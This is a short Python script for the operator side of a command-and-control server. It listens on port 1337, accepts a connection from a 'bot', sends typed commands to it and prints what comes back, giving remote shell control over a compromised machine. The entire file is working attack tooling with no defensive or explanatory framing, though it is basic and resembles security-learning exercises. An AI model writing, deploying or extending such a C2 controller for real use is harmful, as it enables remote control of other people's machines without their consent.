import socket

HOST = "0.0.0.0"
PORT = 1337

def start_server():
	try:	
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.bind((HOST, PORT))
		server.listen(5)
		print(f"[+]Listening on {HOST}:{PORT}...")

		conn, addr = server.accept()
		print(f"[+]Connection from {addr}")
		conn.settimeout(5.0)

		while True:
			cmd = input("C2> ").strip()
			if cmd == "":
				continue

			try:
				conn.send(cmd.encode())
			except Exception as e:
				print(f"[!]Failed to send command: {e}")
				break

			if cmd.lower()=="exit":
				print("[!]Closing connection...")
				break

			try:
				output = conn.recv(4096).decode()
				if not output:
					print("[!] Bot disconnected.")
					break
				print(output)
			except socket.timeout:
				print(f"[!] Timeout: No response from bot.")
			except Exception as e:
				print(f"[!] Failed to receive: {e}")
				break
	except KeyboardInterrupt:
		print("\n[!] Interrupted.")
	finally:
		conn.close()
		server.close()
		print("[+] Server shut down...")


	

if __name__ == "__main__":
	start_server()